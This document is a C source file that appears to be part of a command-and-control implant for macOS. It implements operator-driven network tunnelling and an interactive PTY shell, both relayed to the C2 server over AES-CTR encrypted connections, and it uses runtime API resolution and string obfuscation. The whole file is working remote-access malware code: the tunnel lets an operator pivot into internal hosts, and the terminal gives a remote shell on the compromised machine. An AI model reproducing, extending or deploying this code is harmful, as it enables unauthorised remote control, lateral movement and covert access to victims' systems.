#include "tasks_net.h"
#include "jobs.h"
#include "crt.h"
#include "crypt.h"
#include "types.h"
#include "dyld_resolve.h"
#include "strings_obf.h"

#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <signal.h>
#include <termios.h>
#include <sys/wait.h>

#ifdef DEBUG_TRACE
#include "syscalls_arm64.h"
static void _dbg(const char* msg) {
    size_t len = 0;
    const char* p = msg;
    while (*p++) len++;
    sys_write(2, msg, len);
    sys_write(2, "\n", 1);
}
static void _dbg_hex(const char* prefix, const uint8_t* data, size_t len) {
    // Print prefix
    size_t plen = 0;
    const char* p = prefix;
    while (*p++) plen++;
    sys_write(2, prefix, plen);
    // Print hex bytes (max 32)
    size_t show = len < 32 ? len : 32;
    static const char hx[] = "0123456789abcdef";
    for (size_t i = 0; i < show; i++) {
        char pair[3];
        pair[0] = hx[(data[i] >> 4) & 0xF];
        pair[1] = hx[data[i] & 0xF];
        pair[2] = ' ';
        sys_write(2, pair, 3);
    }
    sys_write(2, "\n", 1);
}
static void _dbg_int(const char* prefix, int64_t val) {
    size_t plen = 0;
    const char* p = prefix;
    while (*p++) plen++;
    sys_write(2, prefix, plen);
    char nbuf[24];
    int ni = 0;
    uint64_t uv;
    if (val < 0) { sys_write(2, "-", 1); uv = (uint64_t)(-val); }
    else uv = (uint64_t)val;
    do { nbuf[ni++] = '0' + (uv % 10); uv /= 10; } while (uv > 0);
    while (ni > 0) { char c = nbuf[--ni]; sys_write(2, &c, 1); }
    sys_write(2, "\n", 1);
}
#else
#define _dbg(msg)                        ((void)0)
#define _dbg_hex(prefix, data, len)      ((void)0)
#define _dbg_int(prefix, val)            ((void)0)
#endif

// ── Helpers ──

static void write_error(mp_writer_t* w, const char* msg) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "error", msg);
}

// Parse channel_id from tunnel command params
static int parse_channel_id(const uint8_t* data, uint32_t data_len) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) return -1;

    for (uint32_t i = 0; i < mc; i++) {
        const char* k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) return -1;
        if (kl == 10 && ax_memcmp(k, "channel_id", 10) == 0) {
            uint64_t v;
            if (mp_read_uint(&r, &v) == 0) return (int)v;
            int64_t sv;
            // Reset reader and try int
            mp_reader_init(&r, data, data_len);
            mp_read_map(&r, &mc);
            for (uint32_t j = 0; j <= i; j++) {
                const char* k2; uint32_t kl2;
                mp_read_str(&r, &k2, &kl2);
                if (j < i) mp_skip(&r);
            }
            if (mp_read_int(&r, &sv) == 0) return (int)sv;
            return -1;
        }
        mp_skip(&r);
    }
    return -1;
}

// ── Tunnel ──
// Go: ParamsTunnelStart{Proto string, ChannelId int, Address string}
// Spawns thread → opens connections to target AND C2 → bidirectional AES-CTR relay

#define TUNNEL_BUF_SIZE  (32 * 1024)  // 32KB relay buffer

typedef struct {
    int  tunnel_idx;
    int  channel_id;
    char proto[8];       // "tcp" or "udp"
    char address[256];   // target address "host:port"
} tunnel_args_t;

// Connect to target address
static int tunnel_connect_target(const char* proto, const char* address, int* out_fd) {
    // Parse host:port
    char host[256] = {0};
    uint16_t port = 0;
    const char* colon = (const char*)0;
    for (const char* p = address; *p; p++) {
        if (*p == ':') colon = p;
    }
    if (!colon) return -1;

    size_t hlen = (size_t)(colon - address);
    if (hlen >= sizeof(host)) return -1;
    ax_memcpy(host, address, hlen);
    host[hlen] = '\0';

    const char* p = colon + 1;
    while (*p >= '0' && *p <= '9') {
        port = port * 10 + (uint16_t)(*p - '0');
        p++;
    }

    int sock_type = SOCK_STREAM;
    if (ax_strcmp(proto, "udp") == 0) sock_type = SOCK_DGRAM;

    struct addrinfo hints, *result;
    ax_memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = sock_type;

    char port_str[8];
    ax_itoa(port, port_str, 10);

    if (R_getaddrinfo(host, port_str, &hints, &result) != 0)
        return -1;

    int fd = R_socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (fd < 0) {
        R_freeaddrinfo(result);
        return -1;
    }

    // Set connect timeout ~200ms via non-blocking + select
    R_fcntl(fd, F_SETFL, O_NONBLOCK);
    int cr = R_connect(fd, result->ai_addr, result->ai_addrlen);
    R_freeaddrinfo(result);

    if (cr < 0 && errno != EINPROGRESS) {
        R_close(fd);
        return -1;
    }

    if (cr < 0) {
        // Wait for connection with timeout
        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(fd, &wfds);
        struct timeval tv = { .tv_sec = 0, .tv_usec = 200000 };  // 200ms

        int sr = R_select(fd + 1, (void*)0, &wfds, (void*)0, &tv);
        if (sr <= 0) {
            R_close(fd);
            return -1;
        }

        // Check for connection error
        int err = 0;
        socklen_t errlen = sizeof(err);
        R_getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &errlen);
        if (err != 0) {
            R_close(fd);
            return -1;
        }
    }

    // Set back to blocking
    int flags = R_fcntl(fd, F_GETFL, 0);
    R_fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);

    *out_fd = fd;
    return 0;
}

static void* tunnel_thread(void* arg) {
    tunnel_args_t* targs = (tunnel_args_t*)arg;
    job_context_t* ctx = &g_job_ctx;

    R_pthread_mutex_lock(&ctx->tunnels_mutex);
    tunnel_entry_t* tun = &ctx->tunnels[targs->tunnel_idx];
    R_pthread_mutex_unlock(&ctx->tunnels_mutex);

    // Connect to target
    int alive = 1;
    uint8_t reason = 0;

    if (tunnel_connect_target(targs->proto, targs->address, &tun->client_fd) != 0) {
        alive = 0;
        reason = 5;  // ECONNREFUSED (generic failure)
        tun->client_fd = -1;
    }

    // Open connection to C2
    if (jobs_open_connection(ctx, &tun->srv_conn) != 0) {
        if (tun->client_fd >= 0) R_close(tun->client_fd);
        tun->active = 0;
        ax_free(targs, sizeof(tunnel_args_t));
        return (void*)0;
    }

    // Generate per-tunnel AES keys
    uint8_t tun_key[16], tun_iv[16];
    ax_random_bytes(tun_key, 16);
    ax_random_bytes(tun_iv, 16);

    _dbg("[TUNNEL] === tunnel_thread start ===");
    _dbg_int("[TUNNEL] channel_id=", targs->channel_id);
    _dbg_int("[TUNNEL] alive=", alive);
    _dbg_hex("[TUNNEL] key=", tun_key, 16);
    _dbg_hex("[TUNNEL] iv=", tun_iv, 16);

    // Send TunnelPack init
    mp_writer_t pack_w;
    mp_writer_init(&pack_w, 256);
    mp_write_map(&pack_w, 6);
    mp_write_kv_uint(&pack_w, "id", ctx->agent_id);
    mp_write_kv_uint(&pack_w, "type", ctx->profile_type);
    mp_write_kv_int(&pack_w, "channel_id", targs->channel_id);
    mp_write_kv_bin(&pack_w, "key", tun_key, 16);
    mp_write_kv_bin(&pack_w, "iv", tun_iv, 16);
    mp_write_kv_bool(&pack_w, "alive", alive ? true : false);

    // Add reason field
    mp_writer_t pack_w2;
    mp_writer_init(&pack_w2, pack_w.buf.len + 32);
    // Rewrite with 7 fields to include reason
    mp_write_map(&pack_w2, 7);
    mp_write_kv_uint(&pack_w2, "id", ctx->agent_id);
    mp_write_kv_uint(&pack_w2, "type", ctx->profile_type);
    mp_write_kv_int(&pack_w2, "channel_id", targs->channel_id);
    mp_write_kv_bin(&pack_w2, "key", tun_key, 16);
    mp_write_kv_bin(&pack_w2, "iv", tun_iv, 16);
    mp_write_kv_bool(&pack_w2, "alive", alive ? true : false);
    mp_write_kv_uint(&pack_w2, "reason", reason);
    mp_writer_free(&pack_w);

    _dbg_int("[TUNNEL] TunnelPack msgpack size=", (int64_t)pack_w2.buf.len);
    _dbg_hex("[TUNNEL] TunnelPack first 32 bytes=", pack_w2.buf.data, pack_w2.buf.len < 32 ? pack_w2.buf.len : 32);

    if (jobs_send_init(ctx, &tun->srv_conn, JOB_TUNNEL,
                       pack_w2.buf.data, (uint32_t)pack_w2.buf.len) != 0) {
        mp_writer_free(&pack_w2);
        if (tun->client_fd >= 0) R_close(tun->client_fd);
        conn_close(&tun->srv_conn);
        tun->active = 0;
        ax_free(targs, sizeof(tunnel_args_t));
        return (void*)0;
    }
    mp_writer_free(&pack_w2);

    if (!alive) {
        conn_close(&tun->srv_conn);
        tun->active = 0;
        ax_free(targs, sizeof(tunnel_args_t));
        return (void*)0;
    }

    // Set up AES-CTR streams with context (preserves partial block state)
    // Server → Client: decrypt with tunKey/tunIv
    // Client → Server: encrypt with tunKey/tunIv
    aes128_ctr_ctx_t dec_ctx, enc_ctx;
    aes128_ctr_init(&dec_ctx, tun_key, tun_iv);
    aes128_ctr_init(&enc_ctx, tun_key, tun_iv);

    // Zero key material
    ax_memset(tun_key, 0, 16);
    ax_memset(tun_iv, 0, 16);

    _dbg("[TUNNEL] AES-CTR setup done, entering relay loop");
    _dbg_hex("[TUNNEL] dec_ctr (initial)=", dec_ctx.counter, 16);
    _dbg_hex("[TUNNEL] enc_ctr (initial)=", enc_ctx.counter, 16);
    _dbg_int("[TUNNEL] srv_fd=", tun->srv_conn.fd);
    _dbg_int("[TUNNEL] client_fd=", tun->client_fd);

    // Bidirectional relay loop using select()
    uint8_t* buf = (uint8_t*)ax_malloc(TUNNEL_BUF_SIZE);
    uint8_t* enc_buf = (uint8_t*)ax_malloc(TUNNEL_BUF_SIZE);

    int srv_fd = tun->srv_conn.fd;
    int _dbg_relay_count = 0;

    while (!tun->canceled) {
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(srv_fd, &rfds);
        if (!tun->paused)
            FD_SET(tun->client_fd, &rfds);

        int maxfd = srv_fd > tun->client_fd ? srv_fd : tun->client_fd;
        struct timeval tv = { .tv_sec = 0, .tv_usec = 500000 };  // 500ms timeout

        int sr = R_select(maxfd + 1, &rfds, (void*)0, (void*)0, &tv);
        if (sr < 0) break;
        if (sr == 0) continue;  // timeout, check canceled

        // Server → Client (decrypt)
        if (FD_ISSET(srv_fd, &rfds)) {
            ssize_t n = R_read(srv_fd, buf, TUNNEL_BUF_SIZE);
            if (n <= 0) {
                _dbg_int("[TUNNEL] srv_fd read returned n=", (int64_t)n);
                break;
            }

            if (_dbg_relay_count < 5) {
                _dbg("[TUNNEL] --- SRV->CLIENT ---");
                _dbg_int("[TUNNEL]   read n=", (int64_t)n);
                _dbg_hex("[TUNNEL]   ciphertext (from srv)=", buf, (size_t)n < 32 ? (size_t)n : 32);
                _dbg_hex("[TUNNEL]   dec_ctr=", dec_ctx.counter, 16);
                _dbg_int("[TUNNEL]   dec_ks_offset=", dec_ctx.ks_offset);
            }

            // Decrypt with AES-CTR
            aes128_ctr_process(&dec_ctx, buf, enc_buf, (size_t)n);

            if (_dbg_relay_count < 5) {
                _dbg_hex("[TUNNEL]   plaintext  (to client)=", enc_buf, (size_t)n < 32 ? (size_t)n : 32);
            }

            // Write to client
            size_t written = 0;
            while (written < (size_t)n) {
                ssize_t w = R_write(tun->client_fd, enc_buf + written, (size_t)n - written);
                if (w <= 0) goto cleanup;
                written += (size_t)w;
            }
        }

        // Client → Server (encrypt)
        if (!tun->paused && FD_ISSET(tun->client_fd, &rfds)) {
            ssize_t n = R_read(tun->client_fd, buf, TUNNEL_BUF_SIZE);
            if (n <= 0) {
                _dbg_int("[TUNNEL] client_fd read returned n=", (int64_t)n);
                break;
            }

            if (_dbg_relay_count < 5) {
                _dbg("[TUNNEL] --- CLIENT->SRV ---");
                _dbg_int("[TUNNEL]   read n=", (int64_t)n);
                _dbg_hex("[TUNNEL]   plaintext  (from client)=", buf, (size_t)n < 32 ? (size_t)n : 32);
                _dbg_hex("[TUNNEL]   enc_ctr=", enc_ctx.counter, 16);
                _dbg_int("[TUNNEL]   enc_ks_offset=", enc_ctx.ks_offset);
            }

            // Encrypt with AES-CTR
            aes128_ctr_process(&enc_ctx, buf, enc_buf, (size_t)n);

            if (_dbg_relay_count < 5) {
                _dbg_hex("[TUNNEL]   ciphertext (to srv)=", enc_buf, (size_t)n < 32 ? (size_t)n : 32);
                _dbg_relay_count++;
            }

            // Write to server
            size_t written = 0;
            while (written < (size_t)n) {
                ssize_t w = R_write(srv_fd, enc_buf + written, (size_t)n - written);
                if (w <= 0) goto cleanup;
                written += (size_t)w;
            }
        }
    }

cleanup:
    _dbg("[TUNNEL] === tunnel_thread cleanup ===");
    _dbg_int("[TUNNEL] relay iterations (first 5 logged)=", (int64_t)_dbg_relay_count);

    ax_free(buf, TUNNEL_BUF_SIZE);
    ax_free(enc_buf, TUNNEL_BUF_SIZE);
    ax_memset(&dec_ctx, 0, sizeof(dec_ctx));
    ax_memset(&enc_ctx, 0, sizeof(enc_ctx));

    if (tun->client_fd >= 0) R_close(tun->client_fd);
    conn_close(&tun->srv_conn);

    R_pthread_mutex_lock(&ctx->tunnels_mutex);
    tun->active = 0;
    R_pthread_mutex_unlock(&ctx->tunnels_mutex);

    ax_free(targs, sizeof(tunnel_args_t));
    return (void*)0;
}

int task_tunnel_start(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    // Parse ParamsTunnelStart{Proto, ChannelId, Address}
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) { write_error(w, "bad params"); return 0; }

    char proto[8] = {0};
    int channel_id = -1;
    char address[256] = {0};

    for (uint32_t i = 0; i < mc; i++) {
        const char* k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) break;
        if (kl == 5 && ax_memcmp(k, "proto", 5) == 0) {
            const char* v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(proto)) { ax_memcpy(proto, v, vl); proto[vl] = '\0'; }
        } else if (kl == 10 && ax_memcmp(k, "channel_id", 10) == 0) {
            uint64_t v;
            if (mp_read_uint(&r, &v) == 0) channel_id = (int)v;
            else {
                int64_t sv;
                if (mp_read_int(&r, &sv) == 0) channel_id = (int)sv;
            }
        } else if (kl == 7 && ax_memcmp(k, "address", 7) == 0) {
            const char* v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(address)) { ax_memcpy(address, v, vl); address[vl] = '\0'; }
        } else {
            mp_skip(&r);
        }
    }

    if (proto[0] == '\0' || channel_id < 0 || address[0] == '\0') {
        write_error(w, "missing tunnel params");
        return 0;
    }

    job_context_t* ctx = &g_job_ctx;

    // Allocate tunnel slot
    R_pthread_mutex_lock(&ctx->tunnels_mutex);
    int idx = -1;
    for (int i = 0; i < MAX_TUNNELS; i++) {
        if (!ctx->tunnels[i].active) {
            idx = i;
            ax_memset(&ctx->tunnels[i], 0, sizeof(tunnel_entry_t));
            ctx->tunnels[i].srv_conn.fd = -1;
            ctx->tunnels[i].client_fd = -1;
            ctx->tunnels[i].channel_id = channel_id;
            ctx->tunnels[i].active = 1;
            break;
        }
    }
    R_pthread_mutex_unlock(&ctx->tunnels_mutex);

    if (idx < 0) { write_error(w, "max tunnels reached"); return 0; }

    // Prepare thread args
    tunnel_args_t* targs = (tunnel_args_t*)ax_malloc(sizeof(tunnel_args_t));
    targs->tunnel_idx = idx;
    targs->channel_id = channel_id;
    ax_strncpy(targs->proto, proto, sizeof(targs->proto) - 1);
    ax_strncpy(targs->address, address, sizeof(targs->address) - 1);

    R_pthread_create(&ctx->tunnels[idx].thread, (void*)0, tunnel_thread, targs);
    R_pthread_detach(ctx->tunnels[idx].thread);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "tunnel starting");
    return 0;
}

int task_tunnel_stop(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    int ch_id = parse_channel_id(data, data_len);
    if (ch_id < 0) { write_error(w, "missing channel_id"); return 0; }

    int idx = tunnels_find(&g_job_ctx, ch_id);
    if (idx < 0) { write_error(w, "tunnel not found"); return 0; }

    g_job_ctx.tunnels[idx].canceled = 1;
    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "tunnel stopped");
    return 0;
}

int task_tunnel_pause(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    int ch_id = parse_channel_id(data, data_len);
    if (ch_id < 0) { write_error(w, "missing channel_id"); return 0; }

    int idx = tunnels_find(&g_job_ctx, ch_id);
    if (idx < 0) { write_error(w, "tunnel not found"); return 0; }

    g_job_ctx.tunnels[idx].paused = 1;
    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "tunnel paused");
    return 0;
}

int task_tunnel_resume(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    int ch_id = parse_channel_id(data, data_len);
    if (ch_id < 0) { write_error(w, "missing channel_id"); return 0; }

    int idx = tunnels_find(&g_job_ctx, ch_id);
    if (idx < 0) { write_error(w, "tunnel not found"); return 0; }

    g_job_ctx.tunnels[idx].paused = 0;
    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "tunnel resumed");
    return 0;
}

// ── Terminal ──
// Go: ParamsTerminalStart{TermId int, Program string, Width int, Height int}
// Spawns thread → opens PTY → connects to C2 → bidirectional AES-CTR relay

// PTY helper: fork with pseudo-terminal
static int pty_fork(const char* program, int width, int height, int* master_fd, int* child_pid_out) {
    int master = R_posix_openpt(O_RDWR | O_NOCTTY);
    if (master < 0) return -1;

    if (R_grantpt(master) != 0 || R_unlockpt(master) != 0) {
        R_close(master);
        return -1;
    }

    char* slave_name = R_ptsname(master);
    if (!slave_name) {
        R_close(master);
        return -1;
    }

    int pid = R_fork();
    if (pid < 0) {
        R_close(master);
        return -1;
    }

    if (pid == 0) {
        // Child
        R_close(master);
        R_setsid();

        int slave = R_open(slave_name, O_RDWR, 0);
        if (slave < 0) R_exit(1);

        // Set terminal size
        struct winsize ws;
        ws.ws_col = (unsigned short)width;
        ws.ws_row = (unsigned short)height;
        ws.ws_xpixel = 0;
        ws.ws_ypixel = 0;
        R_ioctl(slave, TIOCSWINSZ, &ws);

        // Set as controlling terminal
        R_ioctl(slave, TIOCSCTTY, 0);

        R_dup2(slave, 0);
        R_dup2(slave, 1);
        R_dup2(slave, 2);
        if (slave > 2) R_close(slave);

        // Set TERM environment
        R_setenv("TERM", "xterm-256color", 1);

        extern char*** _NSGetEnviron(void);
        char** environ = *_NSGetEnviron();
        char* argv_term[] = { (char*)program, (char*)0 };
        R_execve(program, argv_term, environ);
        R_exit(1);
    }

    // Parent
    *master_fd = master;
    *child_pid_out = pid;
    return 0;
}

typedef struct {
    int  terminal_idx;
    int  term_id;
    char program[256];
    int  width;
    int  height;
} terminal_args_t;

static void* terminal_thread(void* arg) {
    terminal_args_t* targs = (terminal_args_t*)arg;
    job_context_t* ctx = &g_job_ctx;

    R_pthread_mutex_lock(&ctx->terminals_mutex);
    terminal_entry_t* term = &ctx->terminals[targs->terminal_idx];
    R_pthread_mutex_unlock(&ctx->terminals_mutex);

    // Create PTY
    int alive = 1;
    char status_msg[256] = {0};

    if (pty_fork(targs->program, targs->width, targs->height,
                 &term->pty_master, &term->child_pid) != 0) {
        alive = 0;
        ax_strcpy(status_msg, "PTY creation failed");
    }

    // Open connection to C2
    if (jobs_open_connection(ctx, &term->srv_conn) != 0) {
        if (term->pty_master >= 0) R_close(term->pty_master);
        if (term->child_pid > 0) R_kill(term->child_pid, 9);
        term->active = 0;
        ax_free(targs, sizeof(terminal_args_t));
        return (void*)0;
    }

    // Generate per-terminal AES keys
    uint8_t term_key[16], term_iv[16];
    ax_random_bytes(term_key, 16);
    ax_random_bytes(term_iv, 16);

    // Send TermPack init
    mp_writer_t pack_w;
    mp_writer_init(&pack_w, 256);
    mp_write_map(&pack_w, 6);
    mp_write_kv_uint(&pack_w, "id", ctx->agent_id);
    mp_write_kv_int(&pack_w, "term_id", targs->term_id);
    mp_write_kv_bin(&pack_w, "key", term_key, 16);
    mp_write_kv_bin(&pack_w, "iv", term_iv, 16);
    mp_write_kv_bool(&pack_w, "alive", alive ? true : false);
    mp_write_kv_str(&pack_w, "status", status_msg);

    if (jobs_send_init(ctx, &term->srv_conn, JOB_TERMINAL,
                       pack_w.buf.data, (uint32_t)pack_w.buf.len) != 0) {
        mp_writer_free(&pack_w);
        if (term->pty_master >= 0) R_close(term->pty_master);
        if (term->child_pid > 0) R_kill(term->child_pid, 9);
        conn_close(&term->srv_conn);
        term->active = 0;
        ax_free(targs, sizeof(terminal_args_t));
        return (void*)0;
    }
    mp_writer_free(&pack_w);

    if (!alive) {
        conn_close(&term->srv_conn);
        term->active = 0;
        ax_free(targs, sizeof(terminal_args_t));
        return (void*)0;
    }

    // Set up AES-CTR streams with context (preserves partial block state)
    aes128_ctr_ctx_t dec_ctx, enc_ctx;
    aes128_ctr_init(&dec_ctx, term_key, term_iv);
    aes128_ctr_init(&enc_ctx, term_key, term_iv);

    // Zero key material
    ax_memset(term_key, 0, 16);
    ax_memset(term_iv, 0, 16);

    // Bidirectional relay: PTY <-> C2 (AES-CTR encrypted)
    uint8_t* buf = (uint8_t*)ax_malloc(TUNNEL_BUF_SIZE);
    uint8_t* enc_buf = (uint8_t*)ax_malloc(TUNNEL_BUF_SIZE);

    int srv_fd = term->srv_conn.fd;
    int pty_fd = term->pty_master;

    while (!term->canceled) {
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(srv_fd, &rfds);
        FD_SET(pty_fd, &rfds);

        int maxfd = srv_fd > pty_fd ? srv_fd : pty_fd;
        struct timeval tv = { .tv_sec = 0, .tv_usec = 500000 };

        int sr = R_select(maxfd + 1, &rfds, (void*)0, (void*)0, &tv);
        if (sr < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (sr == 0) {
            // Check if child process is still running
            int wstatus;
            int wr = R_waitpid(term->child_pid, &wstatus, WNOHANG);
            if (wr > 0) break;  // Child exited
            continue;
        }

        // Server → PTY (user input, decrypt)
        if (FD_ISSET(srv_fd, &rfds)) {
            ssize_t n = R_read(srv_fd, buf, TUNNEL_BUF_SIZE);
            if (n <= 0) break;

            aes128_ctr_process(&dec_ctx, buf, enc_buf, (size_t)n);

            size_t written = 0;
            while (written < (size_t)n) {
                ssize_t wr = R_write(pty_fd, enc_buf + written, (size_t)n - written);
                if (wr <= 0) goto term_cleanup;
                written += (size_t)wr;
            }
        }

        // PTY → Server (shell output, encrypt)
        if (FD_ISSET(pty_fd, &rfds)) {
            ssize_t n = R_read(pty_fd, buf, TUNNEL_BUF_SIZE);
            if (n <= 0) break;

            aes128_ctr_process(&enc_ctx, buf, enc_buf, (size_t)n);

            size_t written = 0;
            while (written < (size_t)n) {
                ssize_t wr = R_write(srv_fd, enc_buf + written, (size_t)n - written);
                if (wr <= 0) goto term_cleanup;
                written += (size_t)wr;
            }
        }
    }

term_cleanup:
    ax_free(buf, TUNNEL_BUF_SIZE);
    ax_free(enc_buf, TUNNEL_BUF_SIZE);
    ax_memset(&dec_ctx, 0, sizeof(dec_ctx));
    ax_memset(&enc_ctx, 0, sizeof(enc_ctx));

    // Kill shell process
    if (term->child_pid > 0) {
        R_kill(term->child_pid, 9);  // SIGKILL
        R_waitpid(term->child_pid, (void*)0, 0);
    }

    if (term->pty_master >= 0) R_close(term->pty_master);
    conn_close(&term->srv_conn);

    R_pthread_mutex_lock(&ctx->terminals_mutex);
    term->active = 0;
    R_pthread_mutex_unlock(&ctx->terminals_mutex);

    ax_free(targs, sizeof(terminal_args_t));
    return (void*)0;
}

int task_terminal_start(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    // Parse ParamsTerminalStart{TermId, Program, Width, Height}
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) { write_error(w, "bad params"); return 0; }

    int term_id = -1;
    char program[256] = {0};
    int width = 80, height = 24;

    for (uint32_t i = 0; i < mc; i++) {
        const char* k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) break;
        if (kl == 7 && ax_memcmp(k, "term_id", 7) == 0) {
            uint64_t v;
            if (mp_read_uint(&r, &v) == 0) term_id = (int)v;
            else {
                int64_t sv;
                if (mp_read_int(&r, &sv) == 0) term_id = (int)sv;
            }
        } else if (kl == 7 && ax_memcmp(k, "program", 7) == 0) {
            const char* v; uint32_t vl;
            mp_read_str(&r, &v, &vl);
            if (vl < sizeof(program)) { ax_memcpy(program, v, vl); program[vl] = '\0'; }
        } else if (kl == 5 && ax_memcmp(k, "width", 5) == 0) {
            uint64_t v; mp_read_uint(&r, &v); width = (int)v;
        } else if (kl == 6 && ax_memcmp(k, "height", 6) == 0) {
            uint64_t v; mp_read_uint(&r, &v); height = (int)v;
        } else {
            mp_skip(&r);
        }
    }

    if (term_id < 0 || program[0] == '\0') {
        write_error(w, "missing terminal params");
        return 0;
    }

    job_context_t* ctx = &g_job_ctx;

    // Allocate terminal slot
    R_pthread_mutex_lock(&ctx->terminals_mutex);
    int idx = -1;
    for (int i = 0; i < MAX_TERMINALS; i++) {
        if (!ctx->terminals[i].active) {
            idx = i;
            ax_memset(&ctx->terminals[i], 0, sizeof(terminal_entry_t));
            ctx->terminals[i].srv_conn.fd = -1;
            ctx->terminals[i].pty_master = -1;
            ctx->terminals[i].child_pid = -1;
            ctx->terminals[i].term_id = term_id;
            ctx->terminals[i].active = 1;
            break;
        }
    }
    R_pthread_mutex_unlock(&ctx->terminals_mutex);

    if (idx < 0) { write_error(w, "max terminals reached"); return 0; }

    // Prepare thread args
    terminal_args_t* ta = (terminal_args_t*)ax_malloc(sizeof(terminal_args_t));
    ta->terminal_idx = idx;
    ta->term_id = term_id;
    ax_strncpy(ta->program, program, sizeof(ta->program) - 1);
    ta->width = width;
    ta->height = height;

    R_pthread_create(&ctx->terminals[idx].thread, (void*)0, terminal_thread, ta);
    R_pthread_detach(ctx->terminals[idx].thread);

    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "terminal starting");
    return 0;
}

// Parse TermId from terminal stop params
static int parse_term_id(const uint8_t* data, uint32_t data_len) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t mc;
    if (mp_read_map(&r, &mc) != 0) return -1;

    for (uint32_t i = 0; i < mc; i++) {
        const char* k; uint32_t kl;
        if (mp_read_str(&r, &k, &kl) != 0) return -1;
        if (kl == 7 && ax_memcmp(k, "term_id", 7) == 0) {
            uint64_t v;
            if (mp_read_uint(&r, &v) == 0) return (int)v;
            int64_t sv;
            if (mp_read_int(&r, &sv) == 0) return (int)sv;
            return -1;
        }
        mp_skip(&r);
    }
    return -1;
}

int task_terminal_stop(const uint8_t* data, uint32_t data_len, mp_writer_t* w) {
    int tid = parse_term_id(data, data_len);
    if (tid < 0) { write_error(w, "missing term_id"); return 0; }

    int idx = terminals_find(&g_job_ctx, tid);
    if (idx < 0) { write_error(w, "terminal not found"); return 0; }

    g_job_ctx.terminals[idx].canceled = 1;
    mp_write_map(w, 1);
    mp_write_kv_str(w, "status", "terminal stopped");
    return 0;
}
